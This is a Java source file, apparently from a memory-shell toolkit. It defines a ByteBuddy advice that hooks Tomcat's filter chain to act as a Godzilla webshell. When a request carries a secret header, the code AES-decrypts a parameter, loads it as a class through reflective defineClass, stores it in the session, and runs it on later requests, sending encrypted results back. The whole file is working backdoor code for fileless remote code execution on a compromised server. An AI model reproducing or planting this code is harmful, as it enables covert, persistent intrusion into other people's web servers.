package com.reajason.javaweb.memshell.tomcat.godzilla;

import net.bytebuddy.asm.Advice;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Method;
import java.util.Base64;

/**
 * @author ReaJason
 */
public class TomcatFilterChainGodzillaAdvisor {
    public static String key;
    public static String pass;
    public static String md5;
    public static String headerName;
    public static String headerValue;

    @Advice.OnMethodEnter(skipOn = Advice.OnNonDefaultValue.class)
    public static boolean enter(
            @Advice.Argument(value = 0) ServletRequest req,
            @Advice.Argument(value = 1) ServletResponse res
    ) {
        if (!(req instanceof HttpServletRequest)) {
            return false;
        }
        HttpServletRequest request = (HttpServletRequest) req;
        HttpServletResponse response = (HttpServletResponse) res;
        try {
            if (request.getHeader(headerName) != null && request.getHeader(headerName).contains(headerValue)) {
                HttpSession session = request.getSession();
                String parameter = request.getParameter(pass);
                byte[] data = Base64.getDecoder().decode(parameter);
                Cipher c = Cipher.getInstance("AES");
                SecretKeySpec keySpec = new SecretKeySpec(key.getBytes(), "AES");
                c.init(2, keySpec);
                data = c.doFinal(data);
                if (session.getAttribute("payload") == null) {
                    Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                    defineClass.setAccessible(true);
                    Class<?> payload = (Class<?>) defineClass.invoke(Thread.currentThread().getContextClassLoader(), data, 0, data.length);
                    session.setAttribute("payload", payload);
                } else {
                    request.setAttribute("parameters", data);
                    ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
                    Object f = ((Class<?>) session.getAttribute("payload")).newInstance();
                    f.equals(arrOut);
                    f.equals(request);
                    response.getWriter().write(md5.substring(0, 16));
                    f.toString();

                    c.init(1, keySpec);
                    byte[] encryptBytes = c.doFinal(arrOut.toByteArray());
                    String value = Base64.getEncoder().encodeToString(encryptBytes);
                    response.getWriter().write(value);
                    response.getWriter().write(md5.substring(16));
                }
                return true;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return false;
    }
}